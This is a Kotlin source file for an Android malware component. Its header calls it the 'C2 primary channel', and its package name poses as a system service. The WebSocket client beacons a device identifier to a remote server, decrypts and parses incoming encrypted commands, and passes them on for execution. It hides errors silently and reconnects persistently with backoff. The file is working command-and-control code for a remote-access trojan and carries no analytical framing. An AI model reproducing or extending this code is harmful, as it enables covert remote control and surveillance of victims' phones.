// [context: Kotlin, Android API 26+, OkHttp WebSocket C2 primary channel]
package com.system.service.network

import android.content.Context
import com.system.service.core.C2Command
import com.system.service.core.CommandType
import com.system.service.crypto.PayloadDecryptor
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class WebSocketClient(
    private val context: Context,
    private val onCommand: (C2Command) -> Unit
) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var ws: WebSocket? = null
    private var reconnectDelay = 2000L

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    fun connect(url: String) {
        val req = Request.Builder().url(url)
            .header("X-Device-ID", DeviceIdentifier.getDeviceId(context))
            .build()

        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                reconnectDelay = 2000L
                sendBeacon(ws)
            }

            override fun onMessage(ws: WebSocket, text: String) {
                scope.launch { handleMessage(text) }
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                scheduleReconnect(url)
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                scheduleReconnect(url)
            }
        })
    }

    private fun sendBeacon(ws: WebSocket) {
        val beacon = JSONObject().apply {
            put("type", "beacon")
            put("device_id", DeviceIdentifier.getDeviceId(context))
            put("ts", System.currentTimeMillis())
        }
        ws.send(beacon.toString())
    }

    private fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)
            val encPayload = json.optString("payload")
            if (encPayload.isNullOrEmpty()) return
            val raw = PayloadDecryptor.decrypt(
                android.util.Base64.decode(encPayload, android.util.Base64.DEFAULT)
            ) ?: return
            val cmd = parseCommand(JSONObject(String(raw))) ?: return
            onCommand(cmd)
        } catch (_: Exception) {}
    }

    private fun parseCommand(json: JSONObject): C2Command? {
        val typeCode = json.optInt("type", -1)
        val type = CommandType.values().firstOrNull { it.code == typeCode } ?: return null
        val params = mutableMapOf<String, String>()
        json.optJSONObject("params")?.let { p ->
            p.keys().forEach { k -> params[k] = p.getString(k) }
        }
        return C2Command(
            id = json.optString("id"),
            type = type,
            params = params,
            priority = json.optInt("priority", 5)
        )
    }

    fun send(data: ByteArray) {
        ws?.send(okio.ByteString.of(*data))
    }

    private fun scheduleReconnect(url: String) {
        scope.launch {
            delay(reconnectDelay)
            reconnectDelay = minOf(reconnectDelay * 2, 60_000L)
            connect(url)
        }
    }

    fun disconnect() {
        ws?.close(1000, null)
        scope.cancel()
    }
}
